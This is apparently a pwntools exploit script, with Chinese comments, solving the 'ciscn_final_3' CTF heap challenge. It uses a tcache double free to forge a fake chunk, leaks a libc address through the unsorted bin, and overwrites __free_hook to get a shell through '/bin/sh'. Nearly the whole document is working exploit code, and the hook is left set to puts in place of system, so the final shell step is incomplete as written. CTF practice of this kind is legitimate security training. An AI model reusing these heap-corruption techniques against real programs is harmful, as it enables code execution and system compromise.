from pwn import *

context.log_level = "DEBUG"
context.binary = './ciscn_final_3'
sh = process(['./ld.so', './ciscn_final_3'], env={'LD_PRELOAD': './libc.so.6'})
# sh = remote("node4.buuoj.cn", 29996)
libc = ELF("./libc.so.6")
elf = ELF("./ciscn_final_3")


def add(index, size, content):
    sh.sendlineafter('choice >', '1')
    sh.sendlineafter('input the index', str(index))
    sh.sendlineafter('input the size', str(size))
    sh.sendafter('now you can write something', content)
    sh.recvuntil('gift :')
    return int(sh.recvuntil('\n', drop=True), 16)


def delete(index):
    sh.sendlineafter('choice >', '2')
    sh.sendlineafter('input the index', str(index))


# === Step-1: 突破程序的chunk size<=0x81的限制，构造并拿到一个size=0xa1的fake chunk
# vmmap查看heap
heap_base = add(0, 0x20, "a") - 0x5555559c3e70 + 0x00005555559b2000

print("heap_base=>", hex(heap_base))
gdb.attach(sh)
add(1, 0x70, p64(0xdeadbeef012345) + p64(0xa1))  # 用这个申请的chunk的content去构造 fake chunk.size
# 前64bit: prev_size(没free的时候其实是上一个chunk的user data) 后64bit: size=0xa1
# 查看构造的fake chunk:  x /30xg 0x55555750fea0 # 这个地址是 heap chunks 输出的上一个add的chunk的地址
# 内存上与上面申请的相邻 其中包含了fake chunk的下一个chunk和下下个chunk
# 这里还有伪造下下个chunk的size域(大于0x21即可) 否则报 corrupted size vs. prev_size 错误
add(2, 0x70, b"a" * 0x20 + p64(0xdeadbeef) + p64(0x21) + b"b" * 0x18 + p64(0x91))
# 0x60+0x10(prev_size,size)+0x20("a")+p64(0xdeadbeef)+size(0x21)
delete(0)  # 最早free的在tcache链表的最末端
delete(0)
delete(0)
# Tcachebins[idx=1, size=0x30] count=2 # 成环
# 把刚刚delete到tcache(0x30)的申请回来一个(和剩下在tcache(0x30)的chunk其实是同一个)
# 0x11eb0 计算方式: fake chunk的fd域的地址-heap基址 注意不是chunk的基址 是chunk user data的地址
add(3, 0x20, p64(heap_base + 0x11eb0))  # 将手上的chunk(也是tcache(0x30)的第一个chunk)的fd修改成heap_base+0x11eb0
# tcache(0x30)的entry指向的还是add(0, 0x20, "a")的那个chunk 但是fd域已经被修改了
add(4, 0x20, "ab")  # 再拿出一个，tcache(0x30)的entry就成了heap_base+0x11eb0 (把1st chunk的fd域的值赋值给entry)
fake_chunk_addr = add(5, 0x20, "ff")  # entry被修改为heap_base+0x11eb0 # 拿出的这个chunk就是刚刚构造的fake chunk(size=0xa1)
# 可以通过输出的gift上面这个add的chunk地址，然后查看: x /50xg addr-0x10 # 可以看到第二行末尾是0x00a1
print("fake chunk addr=>", hex(fake_chunk_addr))


# === Step-2: 改fake chunk.size=0x51(可以申请回来的大小) 放入tcache(0x51)
for i in range(7):  # 填满tcahe(0xa1)
    delete(5)  # fake chunk
# Tcachebins[idx=8, size=0xa0] count=7 ← Chunk(addr=0x555555e5eeb0, size=0xa0, flags=PREV_INUSE) ← Chunk(addr=0x555555e5eeb0, size=0xa0, flags=PREV_INUSE) → [loop detected] # tcache填满了 unsorted bins为空


delete(1)  # into tcache(0x80) # 这个chunk可以控制fake chunk的size
add(6, 0x70, p64(0xdeadbeef1111) + p64(0x51))  # 改fake chunk的size为0x51
delete(5)  # fake chunk into tcache(0x51) # 因为fake chunk.size=0x51 所以进入tcache(0x51)
delete(5)  # fake chunk into tcache(0x51) # Tcachebins[idx=3, size=0x50] count=2


# === Step-3: 把0xa1的fake chunk放入unsorted bins
delete(1)  # into tcache(0x80) # 这个chunk可以控制fake chunk的size
add(7, 0x70, p64(0xdeadbeef2222) + p64(0xa1))  # 把fake chunk.size改回0xa1
delete(5)  # fake chunk into unsorted bins # tcahe(0xa1)已满 # 链入unsorted bins链表时 fw bk指针指向libc上的一个结构
# tcache(0x51)的第一个chunk就是fake chunk 此时tcache(0x51)的第一个chunk.size=0xa0 fd域改成了libc上的地址(即第二个chunk在libc上)


add(8, 0x40, "a")  # 拿tcache(0x51)上的chunk # 该chunk的fw指向libc上的地址
libc_addr = add(9, 0x40, "a") - 0x7fc25a088ca0 + 0x00007fc259c9d000  # 再拿一次 返回的addr就是前面的fw的值，通过vmmap对比计算出偏移量得到libc基址
# unsorted_bins[0]: fw=0x555555c65ed0, bk=0x555555c65ed0 → Chunk(addr=0x555555c65ee0, size=0x70, flags=PREV_INUSE)
print("libc addr=>", hex(libc_addr))  # 对照这里的基址和vmmap里的libc的基址对不对
libc.address = libc_addr

# === Step: 修改__free_hook : double free
delete(1)  # 这里用8去double free会被检测出double free 原因待探究 # to tcache(0x81)
delete(1)
delete(1)
add(10, 0x70, p64(libc.symbols["__free_hook"]))
add(11, 0x70, "a")  # add前 tcache(0x81) 的第一个chunk的fw=__free_hook # add后entry=__free_hook
add(12, 0x70, p64(libc.symbols["puts"]))  # 将chunk分配到__free_hook上 改*__free_hook为libc.symbols["puts"]
# 本地用system测会有问题 可以用pust替代先看效果
# x /xg &__free_hook 查看__free_hook有没被修改(默认为NULL)


# === Step-: system("/bin/sh")
add(13, 0x70, "/bin/sh\0")  # 这里的size随意 只要是程序运行申请的大小即可
delete(13)

#

sh.interactive(">>>interactive>>>")
